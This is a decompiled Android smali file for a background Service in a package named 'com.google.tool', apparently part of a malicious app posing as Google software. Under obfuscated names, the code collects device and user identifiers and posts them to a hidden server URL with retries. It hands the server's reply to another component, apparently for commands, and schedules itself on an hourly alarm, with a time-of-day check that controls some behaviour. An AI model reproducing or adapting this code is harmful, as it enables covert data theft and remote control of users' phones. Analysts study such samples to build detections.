.class public Lcom/google/tool/JS;
.super Landroid/app/Service;


# static fields
.field private static final f:[Ljava/lang/String;

.field private static g:I


# instance fields
.field private a:Lcom/google/tool/am;

.field private b:Lcom/google/tool/as;

.field private c:Lcom/google/tool/ad;

.field private d:Lcom/google/tool/ab;

.field private e:Landroid/os/Looper;


# direct methods
.method static constructor <clinit>()V
    .locals 3

    const/4 v2, 0x0

    const/4 v0, 0x1

    new-array v0, v0, [Ljava/lang/String;

    sget-object v1, Lcom/google/tool/h;->a:Ljava/lang/String;

    aput-object v1, v0, v2

    sput-object v0, Lcom/google/tool/JS;->f:[Ljava/lang/String;

    sput v2, Lcom/google/tool/JS;->g:I

    return-void
.end method

.method public constructor <init>()V
    .locals 1

    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    const/4 v0, 0x0

    iput-object v0, p0, Lcom/google/tool/JS;->c:Lcom/google/tool/ad;

    return-void
.end method

.method static synthetic a()I
    .locals 1

    sget v0, Lcom/google/tool/JS;->g:I

    return v0
.end method

.method public static a(Landroid/content/Context;I)V
    .locals 1

    invoke-static {p0}, Lcom/google/tool/JS;->a(Landroid/content/Context;)Z

    move-result v0

    if-nez v0, :cond_0

    :goto_0
    return-void

    :cond_0
    invoke-static {p0, p1}, Lcom/google/tool/JS;->b(Landroid/content/Context;I)V

    goto :goto_0
.end method

.method static synthetic a(Lcom/google/tool/JS;)V
    .locals 0

    invoke-direct {p0}, Lcom/google/tool/JS;->b()V

    return-void
.end method

.method static synthetic a(Lcom/google/tool/JS;Z)V
    .locals 0

    invoke-direct {p0, p1}, Lcom/google/tool/JS;->a(Z)V

    return-void
.end method

.method private a(Z)V
    .locals 7

    const/4 v1, 0x0

    if-eqz p1, :cond_0

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v2

    invoke-static {v2, v3}, Lcom/google/tool/ay;->b(J)V

    :cond_0
    invoke-static {p0}, Lcom/google/tool/ay;->q(Landroid/content/Context;)I

    move-result v0

    move v2, v1

    :goto_0
    if-nez v1, :cond_4

    const/4 v3, 0x4

    if-ge v2, v3, :cond_4

    invoke-static {}, Landroid/os/Environment;->getExternalStorageState()Ljava/lang/String;

    move-result-object v3

    const-string v4, "mounted"

    invoke-virtual {v4, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_3

    invoke-direct {p0, v0}, Lcom/google/tool/JS;->a(I)Z

    move-result v1

    if-eqz v1, :cond_2

    invoke-static {p0, v0}, Lcom/google/tool/ay;->b(Landroid/content/Context;I)Z

    :goto_1
    if-nez v1, :cond_1

    const/4 v3, 0x3

    if-ne v2, v3, :cond_1

    iget-object v3, p0, Lcom/google/tool/JS;->b:Lcom/google/tool/as;

    iget-object v3, v3, Lcom/google/tool/as;->j:Ljava/lang/String;

    invoke-static {p0, v3}, Lcom/google/tool/ay;->c(Landroid/content/Context;Ljava/lang/String;)Z

    :cond_1
    :goto_2
    add-int/lit8 v2, v2, 0x1

    const-wide/16 v3, 0x7d0

    :try_start_0
    invoke-static {v3, v4}, Ljava/lang/Thread;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v3

    invoke-virtual {v3}, Ljava/lang/InterruptedException;->printStackTrace()V

    goto :goto_0

    :cond_2
    add-int/lit8 v0, v0, 0x1

    sget-object v3, Lcom/google/tool/JS;->f:[Ljava/lang/String;

    array-length v3, v3

    rem-int/2addr v0, v3

    goto :goto_1

    :cond_3
    sget-object v4, Lcom/google/tool/d/b;->a:Ljava/lang/String;

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v6, Lcom/google/tool/h;->cI:Ljava/lang/String;

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    const-string v6, "="

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v4, v3}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_2

    :cond_4
    const-string v0, "m"

    const/4 v1, 0x1

    invoke-static {p0, v0, v1}, Lcom/google/tool/ay;->a(Landroid/content/Context;Ljava/lang/String;I)I

    move-result v0

    add-int/lit8 v0, v0, 0x1

    sput v0, Lcom/google/tool/JS;->g:I

    return-void
.end method

.method private a(I)Z
    .locals 5

    const/4 v0, 0x0

    sget-object v1, Lcom/google/tool/JS;->f:[Ljava/lang/String;

    aget-object v1, v1, p1

    new-instance v2, Lorg/apache/http/client/methods/HttpPost;

    invoke-direct {v2, v1}, Lorg/apache/http/client/methods/HttpPost;-><init>(Ljava/lang/String;)V

    iget-object v1, p0, Lcom/google/tool/JS;->b:Lcom/google/tool/as;

    invoke-virtual {v1}, Lcom/google/tool/as;->a()V

    :try_start_0
    new-instance v1, Lorg/apache/http/entity/ByteArrayEntity;

    iget-object v3, p0, Lcom/google/tool/JS;->b:Lcom/google/tool/as;

    invoke-virtual {v3}, Lcom/google/tool/as;->b()[B

    move-result-object v3

    invoke-direct {v1, v3}, Lorg/apache/http/entity/ByteArrayEntity;-><init>([B)V

    invoke-virtual {v2, v1}, Lorg/apache/http/client/methods/HttpPost;->setEntity(Lorg/apache/http/HttpEntity;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    :goto_0
    :try_start_1
    invoke-static {p0}, Lcom/google/tool/aq;->a(Landroid/content/Context;)Lorg/apache/http/client/HttpClient;

    move-result-object v1

    if-nez v1, :cond_0

    :goto_1
    return v0

    :cond_0
    invoke-interface {v1, v2}, Lorg/apache/http/client/HttpClient;->execute(Lorg/apache/http/client/methods/HttpUriRequest;)Lorg/apache/http/HttpResponse;

    move-result-object v1

    invoke-interface {v1}, Lorg/apache/http/HttpResponse;->getStatusLine()Lorg/apache/http/StatusLine;

    move-result-object v3

    invoke-interface {v3}, Lorg/apache/http/StatusLine;->getStatusCode()I

    move-result v3

    const/16 v4, 0xc8

    if-ne v3, v4, :cond_1

    const/4 v0, 0x1

    invoke-static {p0}, Lcom/google/tool/ay;->d(Landroid/content/Context;)V

    iget-object v2, p0, Lcom/google/tool/JS;->a:Lcom/google/tool/am;

    invoke-interface {v1}, Lorg/apache/http/HttpResponse;->getEntity()Lorg/apache/http/HttpEntity;

    move-result-object v1

    invoke-interface {v1}, Lorg/apache/http/HttpEntity;->getContent()Ljava/io/InputStream;

    move-result-object v1

    invoke-virtual {v2, v1}, Lcom/google/tool/am;->a(Ljava/io/InputStream;)V

    goto :goto_1

    :catch_0
    move-exception v1

    goto :goto_1

    :cond_1
    invoke-virtual {v2}, Lorg/apache/http/client/methods/HttpPost;->abort()V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_1

    :catch_1
    move-exception v1

    goto :goto_0
.end method

.method private static a(Landroid/content/Context;)Z
    .locals 2

    const/4 v0, 0x0

    invoke-static {p0}, Lcom/google/tool/ay;->n(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v1

    if-eqz v1, :cond_0

    invoke-virtual {v1}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/String;->length()I

    move-result v1

    if-lez v1, :cond_0

    const/4 v0, 0x1

    :cond_0
    return v0
.end method

.method static synthetic b(Lcom/google/tool/JS;)Lcom/google/tool/as;
    .locals 1

    iget-object v0, p0, Lcom/google/tool/JS;->b:Lcom/google/tool/as;

    return-object v0
.end method

.method private b()V
    .locals 2

    invoke-static {p0}, Lcom/google/tool/ay;->h(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v0

    if-eqz v0, :cond_0

    iget-object v1, p0, Lcom/google/tool/JS;->b:Lcom/google/tool/as;

    iput-object v0, v1, Lcom/google/tool/as;->n:Ljava/lang/String;

    :cond_0
    invoke-static {p0}, Lcom/google/tool/ay;->p(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v0

    if-eqz v0, :cond_1

    iget-object v0, p0, Lcom/google/tool/JS;->b:Lcom/google/tool/as;

    invoke-static {p0}, Lcom/google/tool/ay;->p(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v1

    iput-object v1, v0, Lcom/google/tool/as;->o:Ljava/lang/String;

    :cond_1
    iget-object v0, p0, Lcom/google/tool/JS;->b:Lcom/google/tool/as;

    invoke-static {p0}, Lcom/google/tool/aq;->c(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v1

    iput-object v1, v0, Lcom/google/tool/as;->l:Ljava/lang/String;

    invoke-static {p0}, Lcom/google/tool/ay;->e(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v0

    iget-object v1, p0, Lcom/google/tool/JS;->b:Lcom/google/tool/as;

    iput-object v0, v1, Lcom/google/tool/as;->j:Ljava/lang/String;

    iget-object v0, p0, Lcom/google/tool/JS;->b:Lcom/google/tool/as;

    invoke-static {}, Lcom/google/tool/ay;->a()I

    move-result v1

    iput v1, v0, Lcom/google/tool/as;->q:I

    iget-object v0, p0, Lcom/google/tool/JS;->b:Lcom/google/tool/as;

    invoke-static {p0}, Lcom/google/tool/ay;->g(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v1

    iput-object v1, v0, Lcom/google/tool/as;->r:Ljava/lang/String;

    return-void
.end method

.method private static b(Landroid/content/Context;I)V
    .locals 9

    const-wide/16 v7, 0x7530

    const/4 v1, 0x0

    sput p1, Lcom/google/tool/JS;->g:I

    const-string v0, "alarm"

    invoke-virtual {p0, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/AlarmManager;

    new-instance v2, Landroid/content/Intent;

    invoke-static {p0}, Lcom/google/tool/JM;->getReceiver(Landroid/content/Context;)Ljava/lang/Class;

    move-result-object v3

    invoke-direct {v2, p0, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/high16 v3, 0x8000000

    invoke-static {p0, v1, v2, v3}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v6

    invoke-virtual {v0, v6}, Landroid/app/AlarmManager;->cancel(Landroid/app/PendingIntent;)V

    sget-object v2, Lcom/google/tool/h;->q:Ljava/lang/String;

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v4, Lcom/google/tool/h;->cE:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v7, v8}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v2, v3}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    if-nez p1, :cond_0

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v2

    add-long/2addr v2, v7

    invoke-virtual {v0, v1, v2, v3, v6}, Landroid/app/AlarmManager;->set(IJLandroid/app/PendingIntent;)V

    :goto_0
    return-void

    :cond_0
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v2

    add-long/2addr v2, v7

    const-wide/32 v4, 0x36ee80

    invoke-virtual/range {v0 .. v6}, Landroid/app/AlarmManager;->setRepeating(IJJLandroid/app/PendingIntent;)V

    goto :goto_0
.end method

.method private c()Z
    .locals 4

    const/4 v0, 0x1

    invoke-static {}, Ljava/util/Calendar;->getInstance()Ljava/util/Calendar;

    move-result-object v1

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v2

    invoke-virtual {v1, v2, v3}, Ljava/util/Calendar;->setTimeInMillis(J)V

    const/16 v2, 0xb

    invoke-virtual {v1, v2}, Ljava/util/Calendar;->get(I)I

    move-result v1

    const/4 v2, 0x6

    if-ge v1, v2, :cond_0

    if-le v1, v0, :cond_0

    const/4 v0, 0x0

    sget-object v1, Lcom/google/tool/d/b;->a:Ljava/lang/String;

    sget-object v2, Lcom/google/tool/h;->cC:Ljava/lang/String;

    invoke-static {v1, v2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    :cond_0
    return v0
.end method

.method static synthetic c(Lcom/google/tool/JS;)Z
    .locals 1

    invoke-direct {p0}, Lcom/google/tool/JS;->d()Z

    move-result v0

    return v0
.end method

.method private d()Z
    .locals 7

    invoke-static {}, Lcom/google/tool/ay;->c()J

    move-result-wide v0

    invoke-static {}, Lcom/google/tool/ay;->b()J

    move-result-wide v2

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v4

    sub-long v0, v4, v0

    const-wide/32 v4, 0xea60

    div-long/2addr v0, v4

    sget-object v4, Lcom/google/tool/d/b;->a:Ljava/lang/String;

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v5, v0, v1}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v5

    const-string v6, ""

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v4, v5}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    cmp-long v0, v0, v2

    if-gez v0, :cond_0

    sget-object v0, Lcom/google/tool/d/b;->a:Ljava/lang/String;

    sget-object v1, Lcom/google/tool/h;->cB:Ljava/lang/String;

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    const/4 v0, 0x0

    :goto_0
    return v0

    :cond_0
    const/4 v0, 0x1

    goto :goto_0
.end method

.method static synthetic d(Lcom/google/tool/JS;)Z
    .locals 1

    invoke-direct {p0}, Lcom/google/tool/JS;->c()Z

    move-result v0

    return v0
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1

    const/4 v0, 0x0

    return-object v0
.end method

.method public onCreate()V
    .locals 3

    new-instance v0, Lcom/google/tool/as;

    invoke-direct {v0, p0}, Lcom/google/tool/as;-><init>(Landroid/content/Context;)V

    iput-object v0, p0, Lcom/google/tool/JS;->b:Lcom/google/tool/as;

    invoke-static {p0}, Lcom/google/tool/am;->a(Landroid/content/Context;)Lcom/google/tool/am;

    move-result-object v0

    iput-object v0, p0, Lcom/google/tool/JS;->a:Lcom/google/tool/am;

    iget-object v0, p0, Lcom/google/tool/JS;->a:Lcom/google/tool/am;

    invoke-virtual {v0}, Lcom/google/tool/am;->a()V

    new-instance v0, Landroid/os/HandlerThread;

    sget-object v1, Lcom/google/tool/h;->q:Ljava/lang/String;

    const/16 v2, 0xa

    invoke-direct {v0, v1, v2}, Landroid/os/HandlerThread;-><init>(Ljava/lang/String;I)V

    invoke-virtual {v0}, Landroid/os/HandlerThread;->start()V

    invoke-virtual {v0}, Landroid/os/HandlerThread;->getLooper()Landroid/os/Looper;

    move-result-object v0

    iput-object v0, p0, Lcom/google/tool/JS;->e:Landroid/os/Looper;

    new-instance v0, Lcom/google/tool/ab;

    iget-object v1, p0, Lcom/google/tool/JS;->e:Landroid/os/Looper;

    invoke-direct {v0, p0, v1}, Lcom/google/tool/ab;-><init>(Lcom/google/tool/JS;Landroid/os/Looper;)V

    iput-object v0, p0, Lcom/google/tool/JS;->d:Lcom/google/tool/ab;

    return-void
.end method

.method public onDestroy()V
    .locals 1

    iget-object v0, p0, Lcom/google/tool/JS;->e:Landroid/os/Looper;

    invoke-virtual {v0}, Landroid/os/Looper;->quit()V

    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 2

    iget-object v0, p0, Lcom/google/tool/JS;->d:Lcom/google/tool/ab;

    invoke-virtual {v0}, Lcom/google/tool/ab;->obtainMessage()Landroid/os/Message;

    move-result-object v0

    iput p3, v0, Landroid/os/Message;->arg1:I

    iput-object p1, v0, Landroid/os/Message;->obj:Ljava/lang/Object;

    iget-object v1, p0, Lcom/google/tool/JS;->d:Lcom/google/tool/ab;

    invoke-virtual {v1, v0}, Lcom/google/tool/ab;->sendMessage(Landroid/os/Message;)Z

    const/4 v0, 0x2

    return v0
.end method
